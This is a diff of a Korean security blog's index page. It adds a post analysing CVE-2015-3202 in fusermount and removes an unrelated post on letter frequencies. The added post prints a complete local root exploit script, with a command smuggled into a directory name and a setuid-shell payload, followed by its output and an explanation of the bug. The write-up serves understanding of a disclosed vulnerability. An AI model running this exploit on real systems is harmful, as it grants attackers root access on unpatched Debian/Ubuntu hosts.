@@ -9,54 +9,13 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Bootstrapping 1
+  <meta name="description" content="Tavis Ormandy 가 데비안/우분투에서 root 를 얻는 버그를 공개했다. gist Twitter 에 올릴라고 140 자로 압축한 exploit 을 풀어봤다. 1
 2
 3
 4
 5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48 &hellip;">
+z@ubuntu:~$ cat babo.sh
+echo "chmod 4755 /bin/ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -112,6 +71,109 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/22/cve-2015-3202-fusermount/">CVE-2015-3202: Fusermount</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-22T23:07:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>11:07 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Tavis Ormandy 가 데비안/우분투에서 root 를 얻는 버그를 공개했다.</p>
+
+<p><a href="https://gist.github.com/taviso/ecb70eb12d461dd85cba">gist</a></p>
+
+<p>Twitter 에 올릴라고 140 자로 압축한 exploit 을 풀어봤다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ cat babo.sh
+</span><span class='line'>echo "chmod 4755 /bin/sh" &gt; /tmp/babo
+</span><span class='line'>chmod 755 /tmp/babo
+</span><span class='line'>mkdir -p /tmp/babo\;/tmp/babo
+</span><span class='line'>LIBMOUNT_MTAB=/etc/bash.bashrc _FUSE_COMMFD=0 fusermount /tmp/babo\;/tmp/babo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이 간단한 스크립트를 실행해본다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ ./babo.sh
+</span><span class='line'>fusermount: failed to open /etc/fuse.conf: Permission denied
+</span><span class='line'>sending file descriptor: Socket operation on non-socket
+</span><span class='line'>z@ubuntu:~$ cat /etc/bash.bashrc
+</span><span class='line'>/dev/fuse /tmp/.6960;/tmp/.6960 fuse rw,nosuid,nodev,user=z 0 0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>이제 관리자가 sudo 나 root login 하기를 기다린다.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ sudo -s
+</span><span class='line'>bash: /dev/fuse: Permission denied
+</span><span class='line'>root@ubuntu:~# exit
+</span><span class='line'>exit
+</span><span class='line'>z@ubuntu:~$ ls -lL /bin/sh
+</span><span class='line'>-rwsr-xr-x 1 root root 121272 Feb 10    2014 /bin/sh
+</span><span class='line'>z@ubuntu:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>저 스크립트를 돌리면</p>
+
+<ol>
+<li>fusermount 가 바보같이 /etc/bash.bashrc 에다가 마운트 테이블을 overwrite 하는데,</li>
+<li>나중에 root 가 로그인할때 /etc/bash.bashrc 가 수행되면서, (sudo -s)</li>
+<li>/tmp/.6960 이 수행되고</li>
+<li>chmod 4755 /bin/sh 이 수행되면서</li>
+<li>setuid 쉘이 만들어지는 결과</li>
+</ol>
+
+
+<p>가 나오는 것으로 보인다.</p>
+
+<p>핵심은 1 번 버그인 것 같은데,</p>
+
+<ol>
+<li>fusermount 가 setuid 되어있다.</li>
+<li>fusermount 가 /bin/mount 를 부를때 (setuid(geteuid()) 를 해서 ruid 를 0 를 만든다)</li>
+<li>mount 는 root 가 불렀다고 착각한다. (fusermount 입장에서는 의도된 것이긴 하지만, mount 입장에서는 속은 것)</li>
+<li>이제 mount 디버깅용 환경 변수가 먹힌다. (LIBMOUNT_MTAB)</li>
+<li>이제 마운트 테이블로 어떤 화일이든 overwrite 할 수 있다.</li>
+</ol>
+
+
+<p>sudo 쳐주기를 기다려야한다는 점에서, 실전에서 유용성은 많이 떨어진다고 본다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -2389,62 +2451,6 @@ kernel memory, when exploiting custom vulnerabilities.</p>
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/17/average-letter-frequencies-for-english-language-text/">Average Letter Frequencies for English-Language Text</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-17T09:43:11+09:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:43 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">table</span> <span class="o">=</span> <span class="p">{</span>   <span class="s">&#39;a&#39;</span><span class="p">:</span> <span class="mf">8.2</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">:</span> <span class="mf">1.5</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="mf">2.8</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="mf">4.3</span><span class="p">,</span> <span class="s">&#39;e&#39;</span><span class="p">:</span> <span class="mf">12.7</span><span class="p">,</span> <span class="s">&#39;f&#39;</span><span class="p">:</span> <span class="mf">2.2</span><span class="p">,</span>
-</span><span class='line'>            <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="mf">2.0</span><span class="p">,</span> <span class="s">&#39;h&#39;</span><span class="p">:</span> <span class="mf">6.1</span><span class="p">,</span> <span class="s">&#39;i&#39;</span><span class="p">:</span> <span class="mf">7.0</span><span class="p">,</span> <span class="s">&#39;j&#39;</span><span class="p">:</span> <span class="mf">0.2</span><span class="p">,</span> <span class="s">&#39;k&#39;</span><span class="p">:</span> <span class="mf">0.8</span><span class="p">,</span> <span class="s">&#39;l&#39;</span><span class="p">:</span> <span class="mf">4.0</span><span class="p">,</span>
-</span><span class='line'>            <span class="s">&#39;m&#39;</span><span class="p">:</span> <span class="mf">2.4</span><span class="p">,</span> <span class="s">&#39;n&#39;</span><span class="p">:</span> <span class="mf">6.7</span><span class="p">,</span> <span class="s">&#39;o&#39;</span><span class="p">:</span> <span class="mf">1.5</span><span class="p">,</span> <span class="s">&#39;p&#39;</span><span class="p">:</span> <span class="mf">1.9</span><span class="p">,</span> <span class="s">&#39;q&#39;</span><span class="p">:</span> <span class="mf">0.1</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">:</span> <span class="mf">6.0</span><span class="p">,</span>
-</span><span class='line'>            <span class="s">&#39;s&#39;</span><span class="p">:</span> <span class="mf">6.3</span><span class="p">,</span> <span class="s">&#39;t&#39;</span><span class="p">:</span> <span class="mf">9.1</span><span class="p">,</span> <span class="s">&#39;u&#39;</span><span class="p">:</span> <span class="mf">2.8</span><span class="p">,</span> <span class="s">&#39;v&#39;</span><span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">:</span> <span class="mf">2.4</span><span class="p">,</span> <span class="s">&#39;x&#39;</span><span class="p">:</span> <span class="mf">0.2</span><span class="p">,</span>
-</span><span class='line'>            <span class="s">&#39;y&#39;</span><span class="p">:</span> <span class="mf">2.0</span><span class="p">,</span> <span class="s">&#39;z&#39;</span><span class="p">:</span> <span class="mf">0.1</span> <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">sq</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-</span><span class='line'>    <span class="k">for</span> <span class="n">k</span><span class="p">,</span><span class="n">v</span> <span class="ow">in</span> <span class="n">table</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
-</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">v</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span>
-</span><span class='line'>        <span class="n">sq</span> <span class="o">+=</span> <span class="n">f</span><span class="o">*</span><span class="n">f</span>
-</span><span class='line'>    <span class="k">print</span> <span class="n">sq</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>돌리면 <code>0.060251</code> 이 나온다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/10">&larr; Older</a>
@@ -2462,6 +2468,10 @@ kernel memory, when exploiting custom vulnerabilities.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/17/cve-2016-0728/">CVE-2016-0728</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
       </li>
     
@@ -2475,10 +2485,6 @@ kernel memory, when exploiting custom vulnerabilities.</p>
     
       <li class="post">
         <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
       </li>
     
   </ul>
